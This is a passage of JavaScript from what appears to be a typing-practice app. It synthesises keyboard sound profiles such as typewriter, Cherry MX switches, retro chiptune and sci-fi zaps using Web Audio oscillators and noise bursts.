        return;
    }
    if (!audioCtx) {
        console.warn("AudioCtx not initialized in playKeySound");
        return;
    }
    if (audioCtx.state !== 'running') {
        console.warn("AudioCtx state is:", audioCtx.state);
        audioCtx.resume();
    }

    const vol = (userConfig.soundVolume || 70) / 100;
    const profile = userConfig.soundProfile || 'typewriter';
    const t = audioCtx.currentTime;

    const profiles = {
        typewriter: () => playSoundTypewriter(t, vol, correct),
        blue: () => playSoundBlue(t, vol, correct),
        red: () => playSoundRed(t, vol, correct),
        creamy: () => playSoundCreamy(t, vol, correct),
        bubble: () => playSoundBubble(t, vol, correct),
        laser: () => playSoundLaser(t, vol, correct),
        tactile: () => playSoundTactile(t, vol, correct),
        membrane: () => playSoundMembrane(t, vol, correct),
        neon: () => playSoundNeon(t, vol, correct),
        retro: () => playSoundRetro(t, vol, correct),
        space: () => playSoundSpace(t, vol, correct),
        bullet: () => playSoundBullet(t, vol, correct)
    };
    (profiles[profile] || profiles.typewriter)();
}

// ══════════════════════════════════════════════════════════
// PROFILE 1: TYPEWRITER — metallic clack + hammer resonance
// Models: key lever striking platen + spring return
// ══════════════════════════════════════════════════════════
function playSoundTypewriter(t, vol, correct) {
    if (correct) {
        // Layer 1: sharp metallic impact noise (the "clack")
        createNoiseBurst(t, 0.025, 0.12 * vol, rng(4500, 500), 2, 'highpass');

        // Layer 2: body resonance — hammer hitting platen
        const body = audioCtx.createOscillator();
        const bodyGain = audioCtx.createGain();
        body.type = 'sine';
        body.frequency.setValueAtTime(rng(1100, 100), t);
        body.frequency.exponentialRampToValueAtTime(400, t + 0.03);
        bodyGain.gain.setValueAtTime(0.07 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        body.connect(bodyGain); bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.05);

        // Layer 3: subtle low thud (case/desk resonance)
        const thud = audioCtx.createOscillator();
        const thudGain = audioCtx.createGain();
        thud.type = 'sine';
        thud.frequency.setValueAtTime(rng(180, 30), t);
        thud.frequency.exponentialRampToValueAtTime(80, t + 0.04);
        thudGain.gain.setValueAtTime(0.04 * vol, t);
        thudGain.gain.exponentialRampToValueAtTime(0.001, t + 0.06);
        thud.connect(thudGain); thudGain.connect(audioCtx.destination);
        thud.start(t); thud.stop(t + 0.07);

        // Layer 4: spring ping — very faint high ring
        const spring = audioCtx.createOscillator();
        const springGain = audioCtx.createGain();
        spring.type = 'sine';
        spring.frequency.setValueAtTime(rng(5500, 400), t + 0.005);
        springGain.gain.setValueAtTime(0.015 * vol, t + 0.005);
        springGain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        spring.connect(springGain); springGain.connect(audioCtx.destination);
        spring.start(t + 0.005); spring.stop(t + 0.05);
    } else {
        // Error: duller, heavier impact
        createNoiseBurst(t, 0.035, 0.14 * vol, rng(2000, 300), 1.5, 'bandpass');

        const body = audioCtx.createOscillator();
        const bodyGain = audioCtx.createGain();
        body.type = 'square';
        body.frequency.setValueAtTime(rng(400, 50), t);
        body.frequency.exponentialRampToValueAtTime(120, t + 0.06);
        bodyGain.gain.setValueAtTime(0.08 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        body.connect(bodyGain); bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.1);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 2: BLUE SWITCH — Cherry MX Blue two-stage click
// Models: tactile bump → audible click → bottom-out thud
// ══════════════════════════════════════════════════════════
function playSoundBlue(t, vol, correct) {
    if (correct) {
        // Stage 1: tactile bump — short bright click
        const click1 = audioCtx.createOscillator();
        const click1Gain = audioCtx.createGain();
        click1.type = 'square';
        click1.frequency.setValueAtTime(rng(5000, 400), t);
        click1.frequency.exponentialRampToValueAtTime(2200, t + 0.006);
        click1Gain.gain.setValueAtTime(0.09 * vol, t);
        click1Gain.gain.exponentialRampToValueAtTime(0.001, t + 0.012);
        click1.connect(click1Gain); click1Gain.connect(audioCtx.destination);
        click1.start(t); click1.stop(t + 0.015);

        // Impact noise for the bump
        createNoiseBurst(t, 0.01, 0.06 * vol, rng(6000, 500), 3, 'bandpass');

        // Stage 2: release click — slightly delayed, metallic
        const click2 = audioCtx.createOscillator();
        const click2Filter = audioCtx.createBiquadFilter();
        const click2Gain = audioCtx.createGain();
        click2.type = 'triangle';
        const delay2 = rng(0.015, 0.003);
        click2.frequency.setValueAtTime(rng(3800, 300), t + delay2);
        click2.frequency.exponentialRampToValueAtTime(1200, t + delay2 + 0.015);
        click2Filter.type = 'highpass';
        click2Filter.frequency.setValueAtTime(1500, t + delay2);
        click2Gain.gain.setValueAtTime(0.001, t);
        click2Gain.gain.setValueAtTime(0.07 * vol, t + delay2);
        click2Gain.gain.exponentialRampToValueAtTime(0.001, t + delay2 + 0.025);
        click2.connect(click2Filter); click2Filter.connect(click2Gain);
        click2Gain.connect(audioCtx.destination);
        click2.start(t + delay2); click2.stop(t + delay2 + 0.03);

        // Secondary click noise
        createNoiseBurst(t + delay2, 0.012, 0.05 * vol, rng(5000, 500), 2.5, 'bandpass');

        // Case bottom-out thud
        const thud = audioCtx.createOscillator();
        const thudGain = audioCtx.createGain();
        thud.type = 'sine';
        thud.frequency.setValueAtTime(rng(250, 30), t + 0.008);
        thud.frequency.exponentialRampToValueAtTime(100, t + 0.04);
        thudGain.gain.setValueAtTime(0.035 * vol, t + 0.008);
        thudGain.gain.exponentialRampToValueAtTime(0.001, t + 0.05);
        thud.connect(thudGain); thudGain.connect(audioCtx.destination);
        thud.start(t + 0.008); thud.stop(t + 0.06);
    } else {
        // Error: harsh rattly click
        createNoiseBurst(t, 0.03, 0.13 * vol, rng(2500, 400), 1, 'bandpass');

        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'square';
        osc.frequency.setValueAtTime(rng(1800, 200), t);
        osc.frequency.exponentialRampToValueAtTime(300, t + 0.04);
        gain.gain.setValueAtTime(0.1 * vol, t);
        gain.gain.exponentialRampToValueAtTime(0.001, t + 0.06);
        osc.connect(gain); gain.connect(audioCtx.destination);
        osc.start(t); osc.stop(t + 0.08);

        const thud = audioCtx.createOscillator();
        const thudG = audioCtx.createGain();
        thud.type = 'sine';
        thud.frequency.setValueAtTime(150, t);
        thud.frequency.exponentialRampToValueAtTime(60, t + 0.06);
        thudG.gain.setValueAtTime(0.06 * vol, t);
        thudG.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        thud.connect(thudG); thudG.connect(audioCtx.destination);
        thud.start(t); thud.stop(t + 0.1);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 3: CREAMY — deep lubed linear "thock"
// Models: lubed linear switches on dampened plate, no click
// ══════════════════════════════════════════════════════════
function playSoundCreamy(t, vol, correct) {
    if (correct) {
        // Layer 1: muted impact noise — soft dampened contact
        createNoiseBurst(t, 0.045, 0.14 * vol, rng(700, 100), 2.5, 'lowpass');

        // Layer 2: warm sine body — the core "thock" sound
        const body = audioCtx.createOscillator();
        const bodyFilter = audioCtx.createBiquadFilter();
        const bodyGain = audioCtx.createGain();
        body.type = 'sine';
        body.frequency.setValueAtTime(rng(450, 50), t);
        body.frequency.exponentialRampToValueAtTime(180, t + 0.06);
        bodyFilter.type = 'lowpass';
        bodyFilter.frequency.setValueAtTime(800, t);
        bodyFilter.frequency.exponentialRampToValueAtTime(200, t + 0.05);
        bodyFilter.Q.setValueAtTime(3, t);
        bodyGain.gain.setValueAtTime(0.15 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        body.connect(bodyFilter); bodyFilter.connect(bodyGain);
        bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.1);

        // Layer 3: low body resonance — adds warmth and weight
        const sub = audioCtx.createOscillator();
        const subGain = audioCtx.createGain();
        sub.type = 'sine';
        sub.frequency.setValueAtTime(rng(160, 20), t);
        sub.frequency.exponentialRampToValueAtTime(90, t + 0.07);
        subGain.gain.setValueAtTime(0.1 * vol, t);
        subGain.gain.exponentialRampToValueAtTime(0.001, t + 0.1);
        sub.connect(subGain); subGain.connect(audioCtx.destination);
        sub.start(t); sub.stop(t + 0.12);
    } else {
        // Error: muffled thud, deeper and longer
        createNoiseBurst(t, 0.05, 0.15 * vol, 400, 2, 'lowpass');

        const body = audioCtx.createOscillator();
        const bodyGain = audioCtx.createGain();
        body.type = 'sine';
        body.frequency.setValueAtTime(250, t);
        body.frequency.exponentialRampToValueAtTime(100, t + 0.08);
        bodyGain.gain.setValueAtTime(0.16 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.1);
        body.connect(bodyGain); bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.12);

        const sub = audioCtx.createOscillator();
        const subGain = audioCtx.createGain();
        sub.type = 'sine';
        sub.frequency.setValueAtTime(120, t);
        sub.frequency.exponentialRampToValueAtTime(60, t + 0.09);
        subGain.gain.setValueAtTime(0.1 * vol, t);
        subGain.gain.exponentialRampToValueAtTime(0.001, t + 0.12);
        sub.connect(subGain); subGain.connect(audioCtx.destination);
        sub.start(t); sub.stop(t + 0.14);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 4: RED SWITCH — Linear, smooth, "clacky"
// Models: Smooth travel, no bump, sharp plastic bottom-out
// ══════════════════════════════════════════════════════════
function playSoundRed(t, vol, correct) {
    if (correct) {
        // Linear Impact - smooth but fast
        // Noise for plastic-on-plastic impact (lighter than blue, sharper)
        createNoiseBurst(t, 0.025, 0.08 * vol, rng(3000, 500), 2, 'bandpass');

        // Body: lighter clack
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(rng(700, 50), t);
        osc.frequency.exponentialRampToValueAtTime(250, t + 0.05);

        gain.gain.setValueAtTime(0.12 * vol, t);
        gain.gain.exponentialRampToValueAtTime(0.001, t + 0.07); // Fast decay

        osc.connect(gain); gain.connect(audioCtx.destination);
        osc.start(t); osc.stop(t + 0.08);

        // Subtle sub-bass for feeling
        const sub = audioCtx.createOscillator();
        const subG = audioCtx.createGain();
        sub.type = 'sine';
        sub.frequency.setValueAtTime(150, t);
        sub.frequency.exponentialRampToValueAtTime(80, t + 0.06);
        subG.gain.setValueAtTime(0.06 * vol, t);
        subG.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        sub.connect(subG); subG.connect(audioCtx.destination);
        sub.start(t); sub.stop(t + 0.1);

    } else {
        // Error: dull thud
        createNoiseBurst(t, 0.04, 0.12 * vol, 600, 1.5, 'lowpass');
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(200, t);
        osc.frequency.exponentialRampToValueAtTime(80, t + 0.1);
        gain.gain.setValueAtTime(0.1 * vol, t);
        gain.gain.exponentialRampToValueAtTime(0.001, t + 0.12);
        osc.connect(gain); gain.connect(audioCtx.destination);
        osc.start(t); osc.stop(t + 0.15);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 4: BUBBLE — soft rounded "pop" with gentle ring
// Models: soft membrane / topre-like cushioned keypress
// ══════════════════════════════════════════════════════════
function playSoundBubble(t, vol, correct) {
    if (correct) {
        // Layer 1: sine chirp — the "pop" character
        const pop = audioCtx.createOscillator();
        const popGain = audioCtx.createGain();
        pop.type = 'sine';
        pop.frequency.setValueAtTime(rng(1200, 150), t);
        pop.frequency.exponentialRampToValueAtTime(rng(350, 50), t + 0.06);
        popGain.gain.setValueAtTime(0.001, t);
        popGain.gain.linearRampToValueAtTime(0.1 * vol, t + 0.004); // soft attack
        popGain.gain.exponentialRampToValueAtTime(0.001, t + 0.09);
        pop.connect(popGain); popGain.connect(audioCtx.destination);
        pop.start(t); pop.stop(t + 0.1);

        // Layer 2: harmonic ring — gentle overtone
        const ring = audioCtx.createOscillator();
        const ringGain = audioCtx.createGain();
        ring.type = 'sine';
        ring.frequency.setValueAtTime(rng(800, 80), t);
        ring.frequency.exponentialRampToValueAtTime(500, t + 0.08);
        ringGain.gain.setValueAtTime(0.04 * vol, t + 0.003);
        ringGain.gain.exponentialRampToValueAtTime(0.001, t + 0.12);
        ring.connect(ringGain); ringGain.connect(audioCtx.destination);
        ring.start(t + 0.003); ring.stop(t + 0.13);

        // Layer 3: very soft air noise — the cushion release
        createNoiseBurst(t, 0.025, 0.02 * vol, rng(2000, 300), 0.7, 'lowpass');
    } else {
        // Error: deeper, slightly "deflated" bubble
        const pop = audioCtx.createOscillator();
        const popGain = audioCtx.createGain();
        pop.type = 'sine';
        pop.frequency.setValueAtTime(rng(600, 80), t);
        pop.frequency.exponentialRampToValueAtTime(150, t + 0.08);
        popGain.gain.setValueAtTime(0.001, t);
        popGain.gain.linearRampToValueAtTime(0.12 * vol, t + 0.004);
        popGain.gain.exponentialRampToValueAtTime(0.001, t + 0.11);
        pop.connect(popGain); popGain.connect(audioCtx.destination);
        pop.start(t); pop.stop(t + 0.12);

        const ring = audioCtx.createOscillator();
        const ringGain = audioCtx.createGain();
        ring.type = 'sine';
        ring.frequency.setValueAtTime(250, t);
        ring.frequency.exponentialRampToValueAtTime(100, t + 0.1);
        ringGain.gain.setValueAtTime(0.06 * vol, t);
        ringGain.gain.exponentialRampToValueAtTime(0.001, t + 0.14);
        ring.connect(ringGain); ringGain.connect(audioCtx.destination);
        ring.start(t); ring.stop(t + 0.15);

        createNoiseBurst(t, 0.03, 0.03 * vol, 1200, 0.5, 'lowpass');
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 5: LASER — sci-fi energy zap with harmonics
// Models: retro arcade / sci-fi blaster sound
// ══════════════════════════════════════════════════════════
function playSoundLaser(t, vol, correct) {
    if (correct) {
        // Layer 1: primary sawtooth sweep — the core "pew"
        const osc1 = audioCtx.createOscillator();
        const osc1Gain = audioCtx.createGain();
        osc1.type = 'sawtooth';
        osc1.frequency.setValueAtTime(rng(3200, 400), t);
        osc1.frequency.exponentialRampToValueAtTime(rng(200, 50), t + 0.07);
        osc1Gain.gain.setValueAtTime(0.06 * vol, t);
        osc1Gain.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        osc1.connect(osc1Gain); osc1Gain.connect(audioCtx.destination);
        osc1.start(t); osc1.stop(t + 0.09);

        // Layer 2: square wave harmonic — adds grit/buzz
        const osc2 = audioCtx.createOscillator();
        const osc2Gain = audioCtx.createGain();
        osc2.type = 'square';
        osc2.frequency.setValueAtTime(rng(2400, 300), t);
        osc2.frequency.exponentialRampToValueAtTime(150, t + 0.06);
        osc2Gain.gain.setValueAtTime(0.03 * vol, t);
        osc2Gain.gain.exponentialRampToValueAtTime(0.001, t + 0.065);
        osc2.connect(osc2Gain); osc2Gain.connect(audioCtx.destination);
        osc2.start(t); osc2.stop(t + 0.07);

        // Layer 3: bright noise burst — energy dispersion
        createNoiseBurst(t, 0.015, 0.04 * vol, rng(7000, 800), 1.5, 'highpass');
    } else {
        // Error: lower, longer, more menacing zap
        const osc1 = audioCtx.createOscillator();
        const osc1Gain = audioCtx.createGain();
        osc1.type = 'sawtooth';
        osc1.frequency.setValueAtTime(rng(1200, 200), t);
        osc1.frequency.exponentialRampToValueAtTime(60, t + 0.1);
        osc1Gain.gain.setValueAtTime(0.08 * vol, t);
        osc1Gain.gain.exponentialRampToValueAtTime(0.001, t + 0.11);
        osc1.connect(osc1Gain); osc1Gain.connect(audioCtx.destination);
        osc1.start(t); osc1.stop(t + 0.12);

        const osc2 = audioCtx.createOscillator();
        const osc2Gain = audioCtx.createGain();
        osc2.type = 'square';
        osc2.frequency.setValueAtTime(800, t);
        osc2.frequency.exponentialRampToValueAtTime(40, t + 0.09);
        osc2Gain.gain.setValueAtTime(0.05 * vol, t);
        osc2Gain.gain.exponentialRampToValueAtTime(0.001, t + 0.1);
        osc2.connect(osc2Gain); osc2Gain.connect(audioCtx.destination);
        osc2.start(t); osc2.stop(t + 0.11);

        createNoiseBurst(t, 0.025, 0.05 * vol, 3000, 1, 'bandpass');
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 6: TACTILE — Cherry MX Brown subtle bump
// Models: tactile bump without audible click, smooth bottom-out
// ══════════════════════════════════════════════════════════
function playSoundTactile(t, vol, correct) {
    if (correct) {
        // Layer 1: soft bump — brief filtered noise, not as sharp as blue
        createNoiseBurst(t, 0.018, 0.08 * vol, rng(3500, 400), 2, 'bandpass');

        // Layer 2: subtle tactile peak — sine blip for the bump feel
        const bump = audioCtx.createOscillator();
        const bumpGain = audioCtx.createGain();
        bump.type = 'sine';
        bump.frequency.setValueAtTime(rng(1800, 200), t);
        bump.frequency.exponentialRampToValueAtTime(700, t + 0.015);
        bumpGain.gain.setValueAtTime(0.06 * vol, t);
        bumpGain.gain.exponentialRampToValueAtTime(0.001, t + 0.025);
        bump.connect(bumpGain); bumpGain.connect(audioCtx.destination);
        bump.start(t); bump.stop(t + 0.03);

        // Layer 3: smooth bottom-out — warm, muted landing
        const land = audioCtx.createOscillator();
        const landFilter = audioCtx.createBiquadFilter();
        const landGain = audioCtx.createGain();
        land.type = 'sine';
        land.frequency.setValueAtTime(rng(400, 50), t + 0.008);
        land.frequency.exponentialRampToValueAtTime(150, t + 0.04);
        landFilter.type = 'lowpass';
        landFilter.frequency.setValueAtTime(600, t + 0.008);
        landFilter.Q.setValueAtTime(2, t);
        landGain.gain.setValueAtTime(0.07 * vol, t + 0.008);
        landGain.gain.exponentialRampToValueAtTime(0.001, t + 0.055);
        land.connect(landFilter); landFilter.connect(landGain);
        landGain.connect(audioCtx.destination);
        land.start(t + 0.008); land.stop(t + 0.06);
    } else {
        // Error: scratchy, unsatisfying bump
        createNoiseBurst(t, 0.03, 0.12 * vol, rng(2000, 300), 1.5, 'bandpass');

        const body = audioCtx.createOscillator();
        const bodyGain = audioCtx.createGain();
        body.type = 'triangle';
        body.frequency.setValueAtTime(rng(500, 60), t);
        body.frequency.exponentialRampToValueAtTime(150, t + 0.05);
        bodyGain.gain.setValueAtTime(0.09 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.07);
        body.connect(bodyGain); bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.09);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 7: MEMBRANE — soft mushy office keyboard
// Models: rubber dome membrane keyboard, dampened and quiet
// ══════════════════════════════════════════════════════════
function playSoundMembrane(t, vol, correct) {
    if (correct) {
        // Layer 1: soft muted tap — heavily filtered noise
        createNoiseBurst(t, 0.03, 0.1 * vol, rng(800, 100), 1.5, 'lowpass');

        // Layer 2: rubber dome squish — very brief, low-mid sine
        const squish = audioCtx.createOscillator();
        const squishFilter = audioCtx.createBiquadFilter();
        const squishGain = audioCtx.createGain();
        squish.type = 'sine';
        squish.frequency.setValueAtTime(rng(350, 40), t);
        squish.frequency.exponentialRampToValueAtTime(180, t + 0.03);
        squishFilter.type = 'lowpass';
        squishFilter.frequency.setValueAtTime(500, t);
        squishFilter.Q.setValueAtTime(1, t);
        squishGain.gain.setValueAtTime(0.001, t);
        squishGain.gain.linearRampToValueAtTime(0.09 * vol, t + 0.005); // soft attack
        squishGain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        squish.connect(squishFilter); squishFilter.connect(squishGain);
        squishGain.connect(audioCtx.destination);
        squish.start(t); squish.stop(t + 0.05);

        // Layer 3: faint plastic rattle — slight high frequency
        const rattle = audioCtx.createOscillator();
        const rattleGain = audioCtx.createGain();
        rattle.type = 'triangle';
        rattle.frequency.setValueAtTime(rng(2200, 200), t);
        rattle.frequency.exponentialRampToValueAtTime(900, t + 0.012);
        rattleGain.gain.setValueAtTime(0.02 * vol, t);
        rattleGain.gain.exponentialRampToValueAtTime(0.001, t + 0.02);
        rattle.connect(rattleGain); rattleGain.connect(audioCtx.destination);
        rattle.start(t); rattle.stop(t + 0.025);
    } else {
        // Error: dull flat thud
        createNoiseBurst(t, 0.04, 0.12 * vol, 500, 1, 'lowpass');

        const body = audioCtx.createOscillator();
        const bodyGain = audioCtx.createGain();
        body.type = 'sine';
        body.frequency.setValueAtTime(220, t);
        body.frequency.exponentialRampToValueAtTime(90, t + 0.06);
        bodyGain.gain.setValueAtTime(0.12 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        body.connect(bodyGain); bodyGain.connect(audioCtx.destination);
        body.start(t); body.stop(t + 0.1);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 8: NEON — futuristic cyberpunk synth tone
// Models: digital/synth keypress with harmonic shimmer
// ══════════════════════════════════════════════════════════
function playSoundNeon(t, vol, correct) {
    if (correct) {
        // Layer 1: short bright sine ping — digital "tick"
        const ping = audioCtx.createOscillator();
        const pingGain = audioCtx.createGain();
        ping.type = 'sine';
        ping.frequency.setValueAtTime(rng(2800, 300), t);
        ping.frequency.exponentialRampToValueAtTime(rng(1600, 200), t + 0.025);
        pingGain.gain.setValueAtTime(0.08 * vol, t);
        pingGain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        ping.connect(pingGain); pingGain.connect(audioCtx.destination);
        ping.start(t); ping.stop(t + 0.05);

        // Layer 2: triangle shimmer — the "neon hum" overtone
        const shimmer = audioCtx.createOscillator();
        const shimmerGain = audioCtx.createGain();
        shimmer.type = 'triangle';
        shimmer.frequency.setValueAtTime(rng(1400, 150), t);
        shimmer.frequency.exponentialRampToValueAtTime(800, t + 0.05);
        shimmerGain.gain.setValueAtTime(0.04 * vol, t);
        shimmerGain.gain.exponentialRampToValueAtTime(0.001, t + 0.07);
        shimmer.connect(shimmerGain); shimmerGain.connect(audioCtx.destination);
        shimmer.start(t); shimmer.stop(t + 0.08);

        // Layer 3: subtle sub-click — electronic contact
        const sub = audioCtx.createOscillator();
        const subGain = audioCtx.createGain();
        sub.type = 'square';
        sub.frequency.setValueAtTime(rng(600, 80), t);
        sub.frequency.exponentialRampToValueAtTime(300, t + 0.015);
        subGain.gain.setValueAtTime(0.03 * vol, t);
        subGain.gain.exponentialRampToValueAtTime(0.001, t + 0.025);
        sub.connect(subGain); subGain.connect(audioCtx.destination);
        sub.start(t); sub.stop(t + 0.03);
    } else {
        // Error: glitchy digital buzz
        const buzz = audioCtx.createOscillator();
        const buzzGain = audioCtx.createGain();
        buzz.type = 'sawtooth';
        buzz.frequency.setValueAtTime(rng(900, 100), t);
        buzz.frequency.exponentialRampToValueAtTime(200, t + 0.06);
        buzzGain.gain.setValueAtTime(0.07 * vol, t);
        buzzGain.gain.exponentialRampToValueAtTime(0.001, t + 0.08);
        buzz.connect(buzzGain); buzzGain.connect(audioCtx.destination);
        buzz.start(t); buzz.stop(t + 0.09);

        const glitch = audioCtx.createOscillator();
        const glitchGain = audioCtx.createGain();
        glitch.type = 'square';
        glitch.frequency.setValueAtTime(rng(1500, 200), t);
        glitch.frequency.exponentialRampToValueAtTime(400, t + 0.04);
        glitchGain.gain.setValueAtTime(0.05 * vol, t);
        glitchGain.gain.exponentialRampToValueAtTime(0.001, t + 0.06);
        glitch.connect(glitchGain); glitchGain.connect(audioCtx.destination);
        glitch.start(t); glitch.stop(t + 0.07);

        createNoiseBurst(t, 0.02, 0.04 * vol, 4000, 2, 'highpass');
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 9: RETRO — 8-bit chiptune blip
// Models: classic NES/Game Boy button press
// ══════════════════════════════════════════════════════════
function playSoundRetro(t, vol, correct) {
    if (correct) {
        // Layer 1: square wave blip — classic 8-bit character
        const blip = audioCtx.createOscillator();
        const blipGain = audioCtx.createGain();
        blip.type = 'square';
        blip.frequency.setValueAtTime(rng(880, 100), t);
        blip.frequency.setValueAtTime(rng(660, 80), t + 0.015);
        blip.frequency.setValueAtTime(rng(440, 60), t + 0.03);
        blipGain.gain.setValueAtTime(0.07 * vol, t);
        blipGain.gain.exponentialRampToValueAtTime(0.001, t + 0.05);
        blip.connect(blipGain); blipGain.connect(audioCtx.destination);
        blip.start(t); blip.stop(t + 0.06);

        // Layer 2: noise crunch — lo-fi digital artifact
        createNoiseBurst(t, 0.008, 0.04 * vol, rng(4000, 500), 4, 'bandpass');

        // Layer 3: sub pulse — rumble from the console speaker
        const sub = audioCtx.createOscillator();
        const subGain = audioCtx.createGain();
        sub.type = 'square';
        sub.frequency.setValueAtTime(rng(220, 30), t);
        sub.frequency.exponentialRampToValueAtTime(110, t + 0.03);
        subGain.gain.setValueAtTime(0.03 * vol, t);
        subGain.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        sub.connect(subGain); subGain.connect(audioCtx.destination);
        sub.start(t); sub.stop(t + 0.05);
    } else {
        // Error: descending "fail" tone
        const fail = audioCtx.createOscillator();
        const failGain = audioCtx.createGain();
        fail.type = 'square';
        fail.frequency.setValueAtTime(rng(440, 50), t);
        fail.frequency.setValueAtTime(rng(330, 40), t + 0.03);
        fail.frequency.setValueAtTime(rng(220, 30), t + 0.06);
        failGain.gain.setValueAtTime(0.09 * vol, t);
        failGain.gain.exponentialRampToValueAtTime(0.001, t + 0.09);
        fail.connect(failGain); failGain.connect(audioCtx.destination);
        fail.start(t); fail.stop(t + 0.1);

        createNoiseBurst(t, 0.015, 0.05 * vol, 2500, 2, 'bandpass');
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 10: SPACE — ethereal cosmic whoosh
// Models: spaceship console key, ambient sci-fi
// ══════════════════════════════════════════════════════════
function playSoundSpace(t, vol, correct) {
    if (correct) {
        // Layer 1: airy sine sweep — cosmic "wooo"
        const sweep = audioCtx.createOscillator();
        const sweepFilter = audioCtx.createBiquadFilter();
        const sweepGain = audioCtx.createGain();
        sweep.type = 'sine';
        sweep.frequency.setValueAtTime(rng(600, 80), t);
        sweep.frequency.exponentialRampToValueAtTime(rng(1800, 200), t + 0.04);
        sweep.frequency.exponentialRampToValueAtTime(rng(900, 100), t + 0.08);
        sweepFilter.type = 'bandpass';
        sweepFilter.frequency.setValueAtTime(1200, t);
        sweepFilter.Q.setValueAtTime(2, t);
        sweepGain.gain.setValueAtTime(0.001, t);
        sweepGain.gain.linearRampToValueAtTime(0.07 * vol, t + 0.01);
        sweepGain.gain.exponentialRampToValueAtTime(0.001, t + 0.1);
        sweep.connect(sweepFilter); sweepFilter.connect(sweepGain);
        sweepGain.connect(audioCtx.destination);
        sweep.start(t); sweep.stop(t + 0.12);

        // Layer 2: soft shimmer — high harmonic ring
        const ring = audioCtx.createOscillator();
        const ringGain = audioCtx.createGain();
        ring.type = 'sine';
        ring.frequency.setValueAtTime(rng(3200, 300), t);
        ring.frequency.exponentialRampToValueAtTime(2000, t + 0.06);
        ringGain.gain.setValueAtTime(0.025 * vol, t);
        ringGain.gain.exponentialRampToValueAtTime(0.001, t + 0.09);
        ring.connect(ringGain); ringGain.connect(audioCtx.destination);
        ring.start(t); ring.stop(t + 0.1);

        // Layer 3: white noise breath — air dispersion
        createNoiseBurst(t, 0.05, 0.03 * vol, rng(3000, 500), 0.8, 'highpass');
    } else {
        // Error: deep void rumble
        const rumble = audioCtx.createOscillator();
        const rumbleGain = audioCtx.createGain();
        rumble.type = 'sine';
        rumble.frequency.setValueAtTime(rng(200, 30), t);
        rumble.frequency.exponentialRampToValueAtTime(80, t + 0.1);
        rumbleGain.gain.setValueAtTime(0.1 * vol, t);
        rumbleGain.gain.exponentialRampToValueAtTime(0.001, t + 0.12);
        rumble.connect(rumbleGain); rumbleGain.connect(audioCtx.destination);
        rumble.start(t); rumble.stop(t + 0.14);

        const hiss = audioCtx.createOscillator();
        const hissGain = audioCtx.createGain();
        hiss.type = 'sawtooth';
        hiss.frequency.setValueAtTime(600, t);
        hiss.frequency.exponentialRampToValueAtTime(150, t + 0.08);
        hissGain.gain.setValueAtTime(0.04 * vol, t);
        hissGain.gain.exponentialRampToValueAtTime(0.001, t + 0.1);
        hiss.connect(hissGain); hissGain.connect(audioCtx.destination);
        hiss.start(t); hiss.stop(t + 0.12);
    }
}

// ══════════════════════════════════════════════════════════
// PROFILE 11: BULLET — sharp percussive snap
// Models: crisp gunshot-like transient, very short
// ══════════════════════════════════════════════════════════
function playSoundBullet(t, vol, correct) {
    if (correct) {
        // Layer 1: sharp attack noise — the "crack"
        createNoiseBurst(t, 0.012, 0.16 * vol, rng(6000, 800), 1.5, 'highpass');

        // Layer 2: hard transient — percussive snap body
        const snap = audioCtx.createOscillator();
        const snapGain = audioCtx.createGain();
        snap.type = 'sawtooth';
        snap.frequency.setValueAtTime(rng(2000, 300), t);
        snap.frequency.exponentialRampToValueAtTime(200, t + 0.012);
        snapGain.gain.setValueAtTime(0.1 * vol, t);
        snapGain.gain.exponentialRampToValueAtTime(0.001, t + 0.02);
        snap.connect(snapGain); snapGain.connect(audioCtx.destination);
        snap.start(t); snap.stop(t + 0.025);

        // Layer 3: low punch — impact thump
        const punch = audioCtx.createOscillator();
        const punchGain = audioCtx.createGain();
        punch.type = 'sine';
        punch.frequency.setValueAtTime(rng(300, 40), t);
        punch.frequency.exponentialRampToValueAtTime(80, t + 0.02);
        punchGain.gain.setValueAtTime(0.08 * vol, t);
        punchGain.gain.exponentialRampToValueAtTime(0.001, t + 0.035);
        punch.connect(punchGain); punchGain.connect(audioCtx.destination);
        punch.start(t); punch.stop(t + 0.04);
    } else {
        // Error: dull misfire thud
        createNoiseBurst(t, 0.025, 0.14 * vol, rng(2500, 400), 1, 'bandpass');

        const body = audioCtx.createOscillator();
        const bodyGain = audioCtx.createGain();
        body.type = 'triangle';
        body.frequency.setValueAtTime(rng(600, 80), t);
        body.frequency.exponentialRampToValueAtTime(100, t + 0.04);
        bodyGain.gain.setValueAtTime(0.1 * vol, t);
        bodyGain.gain.exponentialRampToValueAtTime(0.001, t + 0.06);
